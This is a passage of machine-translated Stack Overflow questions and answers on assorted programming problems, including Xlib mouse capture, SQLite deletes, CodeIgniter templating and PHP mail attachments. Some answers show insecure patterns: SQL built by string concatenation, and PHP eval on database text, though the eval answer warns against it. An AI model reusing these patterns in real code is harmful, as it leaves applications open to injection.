由于他们正在进行的 Earthday 交易，我已经在 OS X 上升级到了 intelliJ 12，但我遇到了一些令人难以置信的烦人行为：

编辑 Scala 文件时，按箭头键偶尔会切换编辑器选项卡，这在键入时非常烦人。

我试过谷歌解决这个问题，但没有找到任何东西。

# actionscript-3 - 文件参考与文件？

> ID：16122172
> 
> 赞同：2
> 
> 时间：2013-04-20T15:43:33.817
> 
> 标签：actionscript-3, flash, filereference

我想制作一个 Flash 应用程序，用户可以在其中从本地硬盘驱动器加载和保存文件。虽然我经常在 AIR 应用程序中使用`File`和`FileStream`类来完成此操作，但我之前在 SWF 中没有这样做过。

据我所知，该`FileReference`课程用于此目的，尽管由于安全风险它似乎有一些限制。我想知道使用`FileReference`类和使用`File`和`FileStream`类加载和保存文件之间的主要区别是什么。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T18:26:01.093

该类`File`扩展了`FileReference`.
`FileReference`在 FlashPlayer（在浏览器中）中使用是安全的，因为它不会让您修改用户机器中的文件。

如果你想打开一个文件，你需要为用户打开它：`FileReference.browse()`.
要保存文件，您需要要求用户保存它：`FileReference.save()`

使用`File`类，您可以在没有这些对话框的情况下打开、修改和保存文件。
此外，`File`该类为您提供了许多有用的属性，例如：`File.desktopDirectory`等`File.documentsDirectory`。
您可以使用该属性检查文件是否存在，`exists`并且在用户文件系统中操作文件时有很多限制。

您可以在文档中阅读有关[FileReference](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/FileReference.html)和[File](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/filesystem/File.html)类的更多信息。

# android - ZXing 二维码

> ID：16122174
> 
> 赞同：-1
> 
> 时间：2013-04-20T15:43:35.613
> 
> 标签：android, qr-code, zxing

在我的 android 应用程序中，我需要**QR 码阅读器**，因此经过大量搜索，我最终得出结论，无需从头开始实现**QR 码编码/解码器，我可以使用****ZXing**库来完成任务。但现在我坚持如何在我的代码中集成**ZXing**库，然后如何将扫描的数据检索到我的项目的字符串中？我知道，这个问题可能是一个愚蠢的问题，但我是新近引入这样一个话题的。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:00:34.533

[ZXing wiki](https://code.google.com/p/zxing/wiki/ScanningViaIntent)有关于如何轻松完成此操作的说明。

基本上，您包含一些启动 ZXing Android 应用程序的简单代码，然后在 onActivityResult() 中检索结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T15:58:33.847

到目前为止，最简单的方法是，如果您无法编写完整的扫描应用程序，那就不要编写完整的扫描应用程序。在 10 分钟内通过 Intent 与现有的集成：[https ://code.google.com/p/zxing/wiki/ScanningViaIntent](https://code.google.com/p/zxing/wiki/ScanningViaIntent)

# jquery - jQuery Validate 在 IE8 和 Safari 中不起作用

> ID：16122176
> 
> 赞同：2
> 
> 时间：2013-04-20T15:43:56.683
> 
> 标签：jquery, validation, internet-explorer-8, safari

jQuery Validate 在 Firefox 和 Chrome 中效果很好，可以验证客户端并将 POST 发送到 php 电子邮件功能。但在 IE8 和 Safari 中，它直接跳到服务器端验证，因此用户必须使用“后退”按钮来填写必填字段。

这是我的代码：

```
<script type="text/JavaScript">
$(document).ready(function() {
    $("form1").validate( {
        rules: {
            name: {
                required: true
                },
            email: {
                required: true
                }
        }
    )};
});
</script> 
```

这是HTML：

```
<form class="cmxform" action="" method="post" name="WCForm" id="form1" />
<fieldset>
<input name="name" type="text" required="required" id="name" size="25" /> 
```

我错过了什么？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T02:14:28.450

首先，选择器的 id 应该有一个 #：

```
$("#form1") 
```

另外，输入不应该在表单内，而不是让表单标签自动关闭吗？

```
<form class="cmxform" action="" method="post" name="WCForm" id="form1">
    <input name="name" type="text" required="required" id="name" size="25" />
</form> 
```

# objective-c - stringWithFormat 中的枚举引发不兼容的指针类型警告

> ID：16122178
> 
> 赞同：1
> 
> 时间：2013-04-20T15:44:10.437
> 
> 标签：objective-c, cocoa, enums, stringwithformat

我有一个枚举属性：

```
typedef enum syncCodeTypes {
    kCodeNull, 
    kCodeFoo,
    kCodeBar,
    kCodeDone
} syncCodeType;

//...

@property syncCodeType syncCode; 
```

我在一个`stringWithFormat:`：

```
[self showAlertWithMessage:NSLocalizedString(@"Sync Error", @"Sync Error") andInfo:[NSString stringWithFormat:NSLocalizedString("Heads up re foobar code %d.", "Heads up re foobar code %d."), self.syncCode]]; 
```

…并得到这个警告：

> 从不兼容的指针类型传递本地化StringForKey:value:table 的参数 1。

`%u`如果我替换无符号转换说明符（而不是） ，也会发生同样的事情`%d`。编译器不喜欢`%lu`, `%ld`,`%llu`或`%lld`任何一个。

有关相关语言的其他帖子建议枚举既不是有符号也不是无符号的，所以我尝试将枚举显式转换为有符号整数和无符号整数 - 并得到完全相同的错误消息：

```
NSInteger iSyncCode = self.syncCode;
[self showAlertWithMessage:NSLocalizedString(@"Sync Error", @"Sync Error") andInfo:[NSString stringWithFormat:NSLocalizedString(“Heads up re foobar code %d.", “Heads up re foobar code %d."), iSyncCode]];
// compiler still annoyed

NSUInteger uSyncCode = self.syncCode;
[self showAlertWithMessage:NSLocalizedString(@"Sync Error", @"Sync Error") andInfo:[NSString stringWithFormat:NSLocalizedString(“Heads up re foobar code %u.”, “Heads up re foobar code %u.”), uSyncCode]];
// compiler still annoyed 
```

在运行时没有问题——现在。但我想成为犹太教徒。有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:50:14.243

您忘记了 中`@`的字符串之前的 - 符号`NSLocalizedString`。

替换`"Heads up re foobar code %d."`为`@"Heads up re foobar code %d."`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T15:51:16.303

格式说明`%d`符用于`int`变量。但`self.syncCode`不是一个`int`，它是一个`syncCodeType`。

您需要将值转换为`int`：

```
(int)self.syncCode 
```

或整行：

```
[self showAlertWithMessage:NSLocalizedString(@"Sync Error", @"Sync Error") andInfo:[NSString stringWithFormat:NSLocalizedString(@"Heads up re foobar code %d.", @"Heads up re foobar code %d."), (int)self.syncCode]]; 
```

这将使编译器高兴。

PS 正如 phix23 指出的那样，您需要将`NSString`文字而不是 C 字符串文字传递给`NSLocalizedString`.

# aop - 如何选择对具有默认可见性的方法的调用？

> ID：16122185
> 
> 赞同：1
> 
> 时间：2013-04-20T15:44:51.450
> 
> 标签：aop, aspectj

可以使用三个可见性修饰符中的任何一个来挑选对方法的调用，例如

```
call(public * TestClass.*(..)); 
```

但不适用于具有默认可见性的人。我可以这样想：

```
 pointcut bla():
        call(!public * TestClass.*(..))
        && call(!protected * TestClass.*(..))
        && call(!private * TestClass.*(..)); 
```

不过，我想知道是否没有更短的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T19:21:23.397

```
// Intercept caller
pointcut packageVisibleMethodCall() :
    call(!private !public !protected * *(..));

// Intercept callee
pointcut packageVisibleMethodExecution() :
    execution(!private !public !protected * *(..)); 
```

# c# - 具有自定义列的延迟加载 DataGridView

> ID：16122186
> 
> 赞同：2
> 
> 时间：2013-04-20T15:44:53.090
> 
> 标签：c#, winforms, datagridview, invalidoperationexception

我刚刚创建了一个测试项目来调试我遇到的问题，但似乎无法理解这里发生了什么......在这个测试项目中，我只有一个 Form、一个 TabControl 和一个 DataGridView（称为 dgvTest）在 tabControl（第 2 页或更高版本）内的“背景”页面中。这是我用来重现问题的代码：

```
 private void Form1_Load(object sender, EventArgs e)
    {
        dgvTest.DataSource = GetDataSource();
        DataGridViewColumn customColumn = new DataGridViewColumn(new DataGridViewTextBoxCell());
        customColumn.DataPropertyName = "SampleColumn";
        dgvTest.Columns.Insert(dgvTest.Columns["SampleColumn"].Index, customColumn);
        //#region Attempt #1
        //dgvTest.Columns.Remove("SampleColumn");
        //customColumn.Name = "SampleColumn";
        //#endregion
        #region Attempt #2
        dgvTest.Columns["SampleColumn"].Visible = false;
        customColumn.Name = "SampleColumnCbo";
        #endregion
        dgvTest.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
    }

    private DataTable GetDataSource()
    {
        DataTable result = new DataTable();
        result.Columns.Add("SampleColumn");
        result.Columns.Add("Q");
        //no rows needed
        return result;
    } 
```

现在，如果我运行它，DataGridView 只会在我尝试选择它所在的 tabPage 后完全初始化（我的意思是，调用它的 AutoGenerateDataBoundColumns）......此时它会抛出一个 InvalidOperationException，显示“**无法添加列因为它的 CellType 属性为空。** ”或“**至少有一个 DataGridView 控件的列没有单元格模板。** ”（基本上，同样的事情；但我只在我的初始项目和早期阶段收到了第一条消息测试项目，在我将代码最小化到当前状态之前）。奇怪的是，如果 dgvTest 放在第一个 tagPage 上或直接放在 Form 本身内，则不会抛出此异常。

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T17:03:31.907

这似乎与您的 DataGridView 在设置其 DataSource 时（在调用 Form1_Load 代码时）不可见（在背景选项卡上）这一事实有关，即使直到稍后才触发异常。例如，如果您处理`VisibleChanged`DataGridView 的事件并将您的 Form1_Load 代码移动到那里，它将起作用，而不是只注意确保初始化代码仅在第一次单击 TabPage *n*时触发（实际上是一个伪*初始化*事件）。

```
private bool dgvInitialized = false;

private void dgvTest_VisibleChanged(object sender, EventArgs e)
{
    if (dgvTest.Visible && !dgvInitialized)
    {
        dgvInitialized = true;

        // Move Form1_Load code to here instead...
    }
} 
```

# java - 我的 java swing 表单不会启动

> ID：16122191
> 
> 赞同：2
> 
> 时间：2013-04-20T15:45:28.110
> 
> 标签：java, swing, runnable

我之前使用此代码启动了此表单，但在对表单进行了多次编辑后，它将不再启动。有什么建议么？

```
public static void main(String args[]) {
  try {
    for (javax.swing.UIManager.LookAndFeelInfo info: javax.swing.UIManager.getInstalledLookAndFeels()) {
      if ("Nimbus".equals(info.getName())) {
        javax.swing.UIManager.setLookAndFeel(info.getClassName());
        break;
      }
    }
  } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
    java.util.logging.Logger.getLogger(Registrar.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
  }
  //</editor-fold>
  /* Create and display the form */
  java.awt.EventQueue.invokeLater(new Runnable() {
    @Override
    public void run() {
      new Registrar().setVisible(true);
    }
  });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-08T11:04:06.613

可能的发现..

1.  使用调试并找到错误。
2.  从项目>属性>运行检查默认运行并检查默认主类；
3.  删除所有代码并重写主类；

建议：应该有错误信息。你应该发布那个。

# c - 使用 Xlib 获取鼠标点击坐标

> ID：16122196
> 
> 赞同：3
> 
> 时间：2013-04-20T15:45:45.020
> 
> 标签：c, x11, xlib

我想知道如何在屏幕上的任何位置使用 Xlib 获取鼠标单击的 x 和 y 坐标。我发现这篇文章获取当前指针位置

[如何在 X 中获取当前鼠标（指针）位置坐标](https://stackoverflow.com/questions/3585871/how-can-i-get-the-current-mouse-pointer-position-co-ordinates-in-x)，

但我不知道如何修改它，以便在单击鼠标时获取 xy 坐标。我试图编写这段代码，但它什么也没做。

```
#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>

int main (){
int x=-1,y=-1;
XEvent event;
int button;
Display *display = XOpenDisplay(NULL);
if (display == NULL) {
    fprintf(stderr, "Cannot connect to X server!\n");
    exit (EXIT_FAILURE);
}
Window root= XDefaultRootWindow(display);
XSelectInput(display, root, ButtonReleaseMask) ;
while(1){
XNextEvent(display,&event);
switch(event.type){
    case ButtonRelease:
        switch(event.xbutton.button){
            case Button1:
                x=event.xbutton.x;
                y=event.xbutton.y;
                button=Button1;
                break;

            case Button3:
                x=event.xbutton.x;
                y=event.xbutton.y;
                button=Button3;
                break;
            default:
                break;

        }
        break;
    default:
        break;
}
if(x>=0 && y>=0)break;
}
if(button==Button1)printf("leftclick at %d %d \n",x,y);
else printf("rightclick at %d %d \n",x,y);
XCloseDisplay(display);
return 0;
} 
```

这些事件可能会发送到其他窗口，这就是它不起作用的原因。另一个问题是，当我将 ButtonPressMask 添加到 XSelectInput 函数时，我收到以下错误：

```
X Error of failed request:  BadAccess (attempt to access private resource denied)
Major opcode of failed request:  2 (X_ChangeWindowAttributes)
Serial number of failed request:  7
Current serial number in output stream:  7 
```

如果在 C 中有更简单的方法可以做到这一点，我很高兴听到它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-10-03T16:40:16.253

我知道这已经过了几年，所以这对其他人来说是信息。首先，使用另一个库不符合我对更简单的定义。我只使用 xlib 和 C 来做一些自己需要的东西，我想看看我可以使代码变得多么简单。

本质上，您只需要四行代码在现有程序中的 xlib 中执行此操作，其余全部取决于您要如何处理它，printf/sprintf、grab_pixel_color(Display *display, XColor *color) 等。

```
/** gcc position.c -o position -lX11 **/
#include <X11/Xlib.h>
#include <stdio.h>

int main (int argc, char **argv) {
    Window root_window; //<--one
    int root_x, root_y; //<--two
    unsigned int mask; //<--three

    Display *display = XOpenDisplay(NULL);

    /*
    Bool XQueryPointer(display, w, root_return, child_return, root_x_return, root_y_return,
                         win_x_return, win_y_return, mask_return)
          Display *display;
          Window w;
          Window *root_return, *child_return;
          int *root_x_return, *root_y_return;
          int *win_x_return, *win_y_return;
          unsigned int *mask_return;
    */

    XQueryPointer(display, DefaultRootWindow(display), &root_window, &root_window, &root_x, &root_y, &root_x, &root_y, &mask); //<--four

    printf("Mouse coordinates (X: %d, Y: %d)\n", root_x, root_y);

    XCloseDisplay(display);
    return 0;
} 
```

我希望这对其他人有用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-21T08:15:36.880

您可能需要抓住指针。

我不知道您是否只想按下按钮释放。我已将其更改为印刷机，但您可以同时使用：

```
XSelectInput(display, root, ButtonPressMask|ButtonReleaseMask) ; 
```

并重新添加 ButtonRelease 案例。

```
#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>

int main (){
    int x=-1,y=-1;
    XEvent event;
    int button;
    Display *display = XOpenDisplay(NULL);
    if (display == NULL) {
    fprintf(stderr, "Cannot connect to X server!\n");
    exit (EXIT_FAILURE);
    }
    Window root= XDefaultRootWindow(display);
    XGrabPointer(display, root, False, ButtonPressMask, GrabModeAsync,
         GrabModeAsync, None, None, CurrentTime);

    XSelectInput(display, root, ButtonPressMask) ;
    while(1){
    XNextEvent(display,&event);
    switch(event.type){
    case ButtonPress:
        switch(event.xbutton.button){
        case Button1:
        x=event.xbutton.x;
        y=event.xbutton.y;
        button=Button1;
        break;

        case Button3:
        x=event.xbutton.x;
        y=event.xbutton.y;
        button=Button3;
        break;
        default:
        break;

        }
        break;
    default:
        break;
    }
    if(x>=0 && y>=0)break;
    }
    if(button==Button1)printf("leftclick at %d %d \n",x,y);
    else printf("rightclick at %d %d \n",x,y);
    XCloseDisplay(display);
    return 0;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T15:51:16.620

> 如果在 C 中有更简单的方法可以做到这一点，我很高兴听到它。

完美的！然后使用一些人已经为您制作的[libxdo 库。](http://semicomplete.com/files/xdotool/docs/html/xdo_8h.html#aa15b8082764bbd889545c30364f18145)

```
int x, y, scrn;

xdo_t *hndl = xdo_new(NULL);
xdo_mouselocation(hndl, &x, &y, &scrn);
xdo_free(hndl);

printf("Mouse coordinates: x = %4d, y = %4d\n", x, y); 
```

# java - sqlite 和 java 的 ERRO null

> ID：16122200
> 
> 赞同：0
> 
> 时间：2013-04-20T15:46:40.977
> 
> 标签：java, sqlite, netbeans, sqlitemanager

我正在 netbeans 中开发 java 应用程序。我连接了数据库 sqlite，它运行良好。现在，我正在尝试删除数据库中的一个字段：

```
public void delete(){
    dbo.openConnection();
    String sqlCommand = "DELETE FROM restaurante WHERE id_restaurante = " + this.id_restaurante;
    System.out.println(sqlCommand);
    dbo.executeSQL(sqlCommand);
    dbo.closeConnection();
} 
```

当我执行这个方法时，我得到这个错误：

```
DELETE FROM restaurante WHERE id_restaurante = 4
ERRO null 
```

...并且该字段不会在数据库中删除。

如果我复制这一行：`DELETE FROM restaurante WHERE id_restaurante = 4`并尝试在 sqlite 管理器（附加 firefox）中删除，效果很好。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T19:28:57.727

这应该工作

```
String sqlCommand = "DELETE FROM restaurante WHERE id_restaurante = '" +id_restaurante+"'"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:55:39.943

也许试试这个：

```
String sqlCommand = "DELETE FROM `restaurante` WHERE `id_restaurante` = " + this.id_restaurante; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T15:57:32.767

什么是错误空？？？是堆栈跟踪不完整还是您自己编写的？我想对于第二种解决方案，方法有问题

```
dbo.executeSQL(sqlCommand); 
```

调试或添加日志。
检查：

1.  连接正确打开。
2.  检查上面的方法中是否没有空指针。我几乎可以肯定这就是问题所在。
3.  检查您是否有权删除程序中的连接。

# php - 如何在 CodeIgniter 视图中解析字符串中的变量？

> ID：16122205
> 
> 赞同：0
> 
> 时间：2013-04-20T15:47:21.270
> 
> 标签：php, codeigniter, templates, variable-assignment

我有一个名为 get_variable 的函数，它从数据库中获取变量的值。

假设我的变量（存储在数据库中）的值类似于：“我喜欢 $fruit”

我想将这个字符串（将 $fruit 转换为正确的值）传递给我的视图。

我有以下设置（下面的伪代码）：

```
$details['fruit'] = 'apples';
$details['test'] = get_variable('my_variable_name');

$var = $CI->load->view('viewname',$details,TRUE); 
```

问题是在我看来（$var）输出的是“我喜欢 $fruit”

我想要的是“我喜欢苹果”

我觉得我在这里错过了一步，也许是可变变量？（[http://php.net/manual/en/language.variables.variable.php](http://php.net/manual/en/language.variables.variable.php)），但不知道如何让它表现。任何见解将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:27:13.987

如果您确定数据库中的变量是安全的（只有您可以更改它们），您可以像这样评估 get 变量函数中的代码：

```
function get_variable($var, $data = array())
{
  // Here the code that gets the variable from the database
  $db_var = 'I like $fruit';
  extract($data);

  $return = '';
  eval('$return = "' . $db_var . '"');

  return $return;
}

// And then use this in the controller:
$details['test'] = get_variable('my_variable_name', $details); 
```

但是当其他人可以访问数据库变量时，您真的不想使用 eval （真的不要！）。而是使用某种形式的模板，例如“我喜欢 %fruit%”，并使 get_variable 看起来像这样：

```
function get_variable($var, $data = array())
{
  // Here the code that gets the variable from the database
  $db_var = 'I like $fruit';
  extract($data);

  $return = $db_var;
  foreach($data as $var => $value) {
    $return = str_replace('%'.$var.'%', $value, $return);
  }

  return $return;
}

// And then use the same method in the controller:
$details['test'] = get_variable('my_variable_name', $details); // This makes all variables in details available in the database variable 
```

# c - C：无符号整数上的模运算符给出了意外的输出

> ID：16122213
> 
> 赞同：-3
> 
> 时间：2013-04-20T15:48:12.250
> 
> 标签：c, unsigned, modulus, unsigned-integer

```
#include <stdio.h>

main() {
    unsigned a = -20;
    unsigned b = 10;
    printf("%d\n", (a % b));
    printf("%d\n", (-20 % 10));
}

Output:
6
0 
```

第二个 printf 打印预期值 0，而第一个 printf 打印 6。为什么这个带有无符号整数的意外输出？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T15:51:00.830

`unsigned int`可以保存从 0 到 的值`UINT_MAX`，没有负值。所以`-20`转换为`-20 + UINT_MAX + 1`.

在您的系统上：

```
(-20 + UINT_MAX + 1) % 10 != -20 % 10 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T15:52:19.707

你在期待什么？

`a % b`等效于，让我们替换这些值并将一元`-`应用于 unsigned int 值 20，`(UINT_MAX-20+1) % 10`结果的类型是`unsigned int`并且您正在使用 打印它`%d`，这是错误的。你应该`%u`在这里使用。

# google-app-engine - Deploy cloud endpoints on custom domain

> ID：16122217
> 
> 赞同：11
> 
> 时间：2013-04-20T15:48:50.330
> 
> 标签：google-app-engine, google-cloud-endpoints

I'm testing with Google Cloud Endpoints on App Engine and I've mapped my app to a custom domain. It appears that this is not possible. I've tried accessing the endpoint url, changing the host but this gives me a 404. I've also tried to change the root url and backend url for the service, but then I get this error after deployment:

`Endpoints: https://test.neenbedankt.com/_ah/api/myapi@v1 Error: API root https://test.neenbedankt.com/_ah/api not allowed on host version.myappid.appspot.com`

Can somebody confirm this is a limitation? For my current project this would be a showstopper.

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-20T20:23:02.470

Correct, you can not map to a custom domain at current.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-02-23T06:08:11.150

edit: Google CloudEndpoints 2.0 will support this, which is now BETA. As explained by Google in the link below.

Google has now announced this "will be supported" but has not given an ETA.

[https://code.google.com/p/googleappengine/issues/detail?id=9384#c44](https://code.google.com/p/googleappengine/issues/detail?id=9384#c44)

# javascript - 如何在 Opera 浏览器中旋转 div

> ID：16122219
> 
> 赞同：-4
> 
> 时间：2013-04-20T15:48:57.243
> 
> 标签：javascript, css, html, rotator

我想在低于 Opera 10.50 版本中将 div 旋转 20 度以下是我用于旋转 div 的 Javascript 代码：

```
<script type="text/javascript">
    function rotator(value) {
        document.getElementById('divId').style.webkitTransform = "rotate(" + value + "deg)";
        document.getElementById('divId').style.msTransform = "rotate(" + value + "deg)";
        document.getElementById('divId').style.MozTransform = "rotate(" + value + "deg)";
        document.getElementById('divId').style.OTransform = "rotate(" + value + "deg)";
        document.getElementById('divId').style.transform = "rotate(" + value + "deg)";
        document.getElementById('span1').innerHTML = value + " deg";
    }
</script> 
```

HTML 代码：

```
 <body>
    <div id="divId" style="height: 150px; width: 150px background-color:red; border: 1px solid #000;">
        This is Rotator Div
    </div>
    <br />
    Rotate:
    <input type="range" min="-360" max="360" value="0" onchange="rotator(this.value)" /><br />
    Rotate Div in <span id="span1">Zero deg</span>
</body> 
```

我该如何解决我的问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:06:12.627

低于 10.5 的 Opera 版本不支持 CSS 旋转变换，这就是为什么`JavaScript`你的这种方法不起作用的原因。

**见：[http ://caniuse.com/#feat=transforms2d](http://caniuse.com/#feat=transforms2d)**

您可以做的是在 Photoshop 中旋转您的图像，然后上传具有透明背景的图像，但是图像当然是静态的，我怀疑这就是您想要的。

# url - URL 转发取决于客户端

> ID：16122224
> 
> 赞同：1
> 
> 时间：2013-04-20T15:49:54.097
> 
> 标签：url, redirect, web, forwarding

是否可以使用一个 URL，例如“www.voucheres.com”并将其转发到：

1.  “www.example1.com”在桌面网络浏览器上打开时
2.  “www.appstore.com/exampleurl/”在 iOS 设备上打开时
3.  “www.playstore.com/exampleurl2/”在 Android 设备上打开时？

所以转发应该依赖于客户端（Windows / OSX / iOS / Android）

# ios - 检测 UIImagePicker 实时视图触摸而不“抓取”它们

> ID：16122226
> 
> 赞同：2
> 
> 时间：2013-04-20T15:49:59.140
> 
> 标签：ios, uiimagepickercontroller

我正在编写一个允许用户使用 UIImagePickerController 拍照的应用程序。

我使用自己的按钮栏和在 imagePicker 视图上添加的一些其他按钮/选项（视图）自定义了 UIImagePicker。以下是相关代码：

```
self.photoPicker.sourceType = UIImagePickerControllerSourceTypeCamera;
self.photoPicker.allowsEditing = NO;
self.photoPicker.showsCameraControls = NO;

[self.photoPicker.view addSubview:topButtonView];
[self.photoPicker.view addSubview:topButtonView2]; 
```

除了一个问题外，一切都按预期工作。我首先针对 iOS 4 及更高版本的这个应用程序，我需要具备的功能之一是嵌入在 UIImagePickerController 中的点击对焦功能。这是问题所在。在 iOS 4 上，当用户点击实时视图时，会获得（由选取器控制器自动呈现）一个视觉指示器（方形），显示相机正在对焦和调整曝光的点。在 iOS 5 和 6 上，视觉指示器消失了。功能（点击聚焦）仍然存在，但不再向用户显示设置焦点的位置。

我已经搜索并阅读了几个类似的问题（但不完全），答案通常指向在 UIImagePicker 实时视图上添加透明子视图并捕获触摸事件。这很容易，但问题是，在我捕捉到用户的触摸之后，我发现没有办法将该触摸传递给 UIImagePicker liveView。

我试图创建一个自定义视图类来添加 de imagepicker 视图，但无法使其工作。这是自定义类代码：

```
@interface touchGrabberViewController : UIViewController 
<UIImagePickerControllerDelegate, UINavigationControllerDelegate>

{
CGPoint tapPoint;
__unsafe_unretained IBOutlet UIImageView *tapFocusIndicator;
NSTimer *indicatorDismisser;

}

@property (unsafe_unretained, nonatomic) UIImagePickerController *photoPicker;

@end

@implementation touchGrabberViewController

@synthesize photoPicker;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization

    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];
    tapFocusIndicator.hidden = YES;
}

- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event
{
    return photoPicker.view;
}

- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
    UITouch *touch = touches.anyObject;

   tapPoint = [touch locationInView:self.view];
    [self showTapFocusIndicator];

    [super touchesBegan:touches withEvent:event];
}

- (void)showTapFocusIndicator
{

    if (!indicatorDismisser)
    {
        tapFocusIndicator.center = tapPoint;

        tapFocusIndicator.hidden = NO;

        indicatorDismisser = [NSTimer scheduledTimerWithTimeInterval:0.5
                                                           target:self
                                                         selector:@selector(hideTapFocusIndicatorWithTimer:)
                                                         userInfo:nil
                                                          repeats:NO];
    }

}

- (void)hideTapFocusIndicatorWithTimer:(NSTimer *)timer
{
    tapFocusIndicator.alpha = 1.0;

    [UIView beginAnimations:nil context:NULL];
    [UIView setAnimationDelay:0.5];
    [UIView setAnimationDelegate:self];
    [UIView setAnimationDidStopSelector:@selector(resetTapFocusIndicator)];
    tapFocusIndicator.alpha = 0.0;

    [UIView commitAnimations];

    [indicatorDismisser invalidate];
    indicatorDismisser = nil;
}

- (void)resetTapFocusIndicator
{
    tapFocusIndicator.hidden = YES;
    tapFocusIndicator.alpha = 1.0;
} 
```

在这个类中，当用户点击时，我会看到一个非常相似的视觉指示器，但是用户的触摸永远不会被转发回实时视图，因此失去了焦点功能。

最近我决定放弃 iOS 4，只针对版本 5 和 6，但我错过了那个视觉指示器。作为相机应用程序用户，该指标非常有用。

我一直在用 (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event 尝试替代方案，但没有运气。

任何人都知道如何实现这一目标，或者我做错了什么？

谢谢你。

# python - Json 输出在一个元组中没有，一个或多个字典 - 最好的操作方式？（Bitstamp 交易清单）

> ID：16122228
> 
> 赞同：0
> 
> 时间：2013-04-20T15:50:04.093
> 
> 标签：python, json, api

Hy，仍然是 python 初学者，我正在寻求帮助，为我指明正确的方向：
我正在尝试从 bitstamp 中构建一个 api 答案数据库，列出 bitstamp 上的交易。

api-call 给出了一个时间范围内的所有交易，输出是 json。
用 json.loads() 处理 api 输出后输出可以

1.  无交易：`[]`
2.  一笔交易：`{'key':'value',....}`
3.  许多交易： `{'key':'value',....} {'key':'value',....} {'key':'value',....}`

据我了解：

1.  好的：`if x=='[]':return`
2.  好的：`for key in x: print(x[key])`
3.  似乎是一个元组。不知道如何处理，我想从事务元组中制作尽可能多的字典。对于每个`dict[x]`包含元组的元组来说都是这样。

我知道一些mysql，最后我想要一个每行一个交易的表，按时间顺序排序，所以我可以构建交易价格图表或某种二维数组，我可以访问`array[x][y]`。

我不要求一个完整的解决方案，只是一个简短的想法，它可以/应该如何完成，所以我可以通过教程开始我的方式:)

ps： json.load 的原因是，本机输出就像`[{key:value, ..} {key:value,...}]`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:10:44.620

我会遍历所有返回的事务并将它们插入到您的数据库中。最简单的情况是每个事务都有相同的键，但您也可以相当容易地处理可变键。我建议在 python 中使用 mysql ，你可以[在这里](http://zetcode.com/db/mysqlpython/)`MySQLdb`找到一个很好的教程。

```
for transaction in output:
    # INSERT into TABLE VALUES(...,...,...) 
```

此循环具有处理没有返回输出（循环未运行）的情况的额外优势。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:05:07.837

假设所有事务都包含相同的结构，使用 a`for item in json_tuple`来处理事务是完全可以的。

这完全取决于您想对数据集做什么。

# php - 如何使用 php 将 preg_replace 替换为增量计数？

> ID：16122230
> 
> 赞同：1
> 
> 时间：2013-04-20T15:50:14.620
> 
> 标签：php, regex, php-5.3

我需要用增量计数替换某个模式。我的代码：

```
$text = "Hello (apple) hello (banana) hello (cucumber)";
$pattern = '/\(([^\)]*)\)/s';

$i = 0;
$returnText = preg_replace_callback($pattern, function($matches) use ($i) {
    return '<sup>['.$i++.']</sup>';
}, $text);

echo $returnText; 
```

结果：

```
Hello [0] hello [0] hello [0] 
```

我需要的：

```
Hello [0] hello [1] hello [2] 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T15:58:49.413

您忘记通过引用传递 $i 。**只需在$i**之前添加**&**：

 **```
$returnText = preg_replace_callback($pattern, function($matches) use (&$i) 
```**

# php - 使用 php mail() 附加邮件？

> ID：16122232
> 
> 赞同：1
> 
> 时间：2013-04-20T15:50:31.760
> 
> 标签：php

这是我用来发送带有附件的电子邮件的代码片段，但它不起作用。我得到的输出包括大量的哈希码（我想是的）。应该怎么做才能将 screenshot.rar 作为附件发送？

```
<?php

      $to = "abc@gmail.com";

      $subject = "A test email";

      $random_hash = md5(date('r', time()));

      $headers = "From: xyz@gmail.com\r\n";

      $headers .= "\r\nContent-Type: multipart/mixed; boundary=\"PHP-mixed-".$random_hash."\"";

      $attachment = chunk_split(base64_encode(file_get_contents("screenshot.rar")));

      $output = "
      --PHP-mixed-$random_hash
